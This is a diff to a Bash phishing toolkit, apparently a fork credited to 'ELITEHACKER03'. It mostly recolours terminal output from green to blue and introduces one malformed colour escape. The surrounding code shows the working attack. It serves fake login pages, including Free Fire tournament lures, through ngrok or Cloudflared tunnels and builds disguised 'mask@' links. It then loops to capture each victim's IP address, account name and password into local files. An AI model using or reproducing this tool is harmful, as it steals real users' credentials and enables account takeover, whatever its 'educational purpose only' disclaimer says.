@@ -19,7 +19,7 @@ G="\033[1;96m"
 W="\e[1;0m"
 
 ## ANSI colors (FG & BG)
-RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
+RED="$(printf '\033[33m')"  GREEN="$(printf '\033[33')"  ORANGE="$(printf '\033[32m')"  BLUE="$(printf '\033[35m')"
 MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
 REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
 MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
@@ -168,32 +168,32 @@ banner_small() {
 
 ## Dependencies
 dependencies() {
-	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
+	echo -e "\n${BLUE}[${WHITE}+${BLUE}]${CYAN} Installing required packages..."
 
     if [[ -d "/data/data/com.termux/files/home" ]]; then
         if [[ `command -v proot` ]]; then
             printf ''
         else
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
+			echo -e "\n${BLUE}[${WHITE}+${BLUE}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
             pkg install proot resolv-conf -y
         fi
 
         if [[ `command -v tput` ]]; then
             printf ''
         else
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
+			echo -e "\n${BLUE}[${WHITE}+${BLUE}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
             pkg install ncurses-utils -y
         fi
 
     fi
 
 	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
+		echo -e "\n${BLUE}[${WHITE}+${BLUE}]${BLUE} Packages already installed."
 	else
 		pkgs=(php curl wget unzip)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
-				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
+				echo -e "\n${BLUE}[${WHITE}+${BLUE}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
 				if [[ `command -v pkg` ]]; then
 					pkg install "$pkg" -y
 				elif [[ `command -v apt` ]]; then
@@ -253,9 +253,9 @@ download_cloudflared() {
 ## Install ngrok
 install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
+		echo -e "\n${BLUE}[${WHITE}+${BLUE}]${BLUE} Ngrok already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
+		echo -e "\n${BLUE}[${WHITE}+${BLUE}]${CYAN} Installing ngrok..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
@@ -273,9 +273,9 @@ install_ngrok() {
 ## Install Cloudflared
 install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+		echo -e "\n${BLUE}[${WHITE}+${BLUE}]${BLUE} Cloudflared already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		echo -e "\n${BLUE}[${WHITE}+${BLUE}]${CYAN} Installing Cloudflared..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
@@ -301,23 +301,23 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN}Author      ${RED}:  ${ORANGE}ISMAIL HISHAM${RED}[ ${ORANGE}ELITEHACKER03${RED}]
-		${GREEN}Github      ${RED}:  ${CYAN}https://github.com/elitehacker03
-		${GREEN}instagram   ${RED}:  ${CYAN}hisham_03_
-		${GREEN}Version     ${RED}:  ${ORANGE}1.0
+		${BLUE}Author      ${RED}:  ${ORANGE}ISMAIL HISHAM${RED}[ ${ORANGE}ELITEHACKER03${RED}]
+		${BLUE}Github      ${RED}:  ${CYAN}https://github.com/elitehacker03
+		${BLUE}instagram   ${RED}:  ${CYAN}hisham_03_
+		${BLUE}Version     ${RED}:  ${ORANGE}1.0
 		${RED}Warning:${WHITE}
 		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
 		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${BLUE} Select an option : ${BLUE}"
 
 	case $REPLY in 
 		99)
 			msg_exit;;
 		0 | 00)
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
+			echo -ne "\n${BLUE}[${WHITE}+${BLUE}]${CYAN} Returning to main menu..."
 			{ sleep 1; main_menu; };;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -341,7 +341,7 @@ setup_site() {
 capture_ip() {
 	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Victim's IP : ${BLUE}$IP"
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
 	cat .server/www/ip.txt >> ip.txt
 }
@@ -351,8 +351,8 @@ capture_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
 	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Account : ${BLUE}$ACCOUNT"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Password : ${BLUE}$PASSWORD"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
 	cat .server/www/usernames.txt >> usernames.dat
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
@@ -363,13 +363,13 @@ capture_data() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${BLUE} Victim IP Found !"
 			capture_ip
 			rm -rf .server/www/ip.txt
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${BLUE} Login info Found !!"
 			capture_creds
 			rm -rf .server/www/usernames.txt
 		fi
@@ -379,9 +379,9 @@ capture_data() {
 
 ## Start ngrok
 start_ngrok() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Initializing... ${BLUE}( ${CYAN}http://$HOST:$PORT ${BLUE})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Launching Ngrok..."
 
     if [[ `command -v termux-chroot` ]]; then
         sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
@@ -392,8 +392,8 @@ start_ngrok() {
 	{ sleep 8; clear; banner_small; }
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${BLUE}$ngrok_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${BLUE}$mask@$ngrok_url1"
 	capture_data
 }
 
@@ -403,9 +403,9 @@ start_ngrok() {
 ## Start Cloudflared
 start_cloudflared() { 
         rm .cld.log > /dev/null 2>&1 &
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Initializing... ${BLUE}( ${CYAN}http://$HOST:$PORT ${BLUE})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Launching Cloudflared..."
 
     if [[ `command -v termux-chroot` ]]; then
 		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
@@ -417,17 +417,17 @@ start_cloudflared() {
 	
 	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
 	cldflr_link1=${cldflr_link#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${BLUE}$cldflr_link"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${BLUE}$mask@$cldflr_link1"
 	capture_data
 }
 
 ## Start localhost
 start_localhost() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Initializing... ${BLUE}( ${CYAN}http://$HOST:$PORT ${BLUE})"
 	setup_site
 	{ sleep 1; clear; banner_small; }
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Successfully Hosted at : ${BLUE}${CYAN}http://$HOST:$PORT ${BLUE}"
 	capture_data
 }
 
@@ -440,7 +440,7 @@ tunnel_menu() {
 		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}NEW!${RED}]
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${BLUE} Select a port forwarding service : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -463,7 +463,7 @@ site_FF() {
 		${RED}[${WHITE}03${RED}]${ORANGE} Free fire tournament 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${BLUE} Select an option : ${BLUE}"
 
         case $REPLY in
 		1)
@@ -496,7 +496,7 @@ main_menu() {
 				
 	EOF
 	
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${BLUE} Select an option : ${BLUE}"
 
 	case $REPLY in 			
 		1 | 01)
